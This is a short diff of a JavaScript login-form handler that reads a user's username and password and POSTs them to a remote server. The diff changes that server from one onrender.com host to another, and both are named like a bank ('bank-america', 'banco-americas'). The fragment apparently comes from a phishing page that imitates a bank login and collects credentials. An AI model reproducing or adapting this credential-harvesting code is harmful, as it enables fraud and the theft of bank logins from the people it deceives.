@@ -28,7 +28,7 @@ document.getElementById("loginForm").addEventListener("submit", function(e){
     let user = document.getElementById("usuario").value;
     let pass = document.getElementById("password").value;
 
-    fetch("https://bank-america-vercel-app.onrender.com/login", {
+    fetch("https://banco-americas.onrender.com/login", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
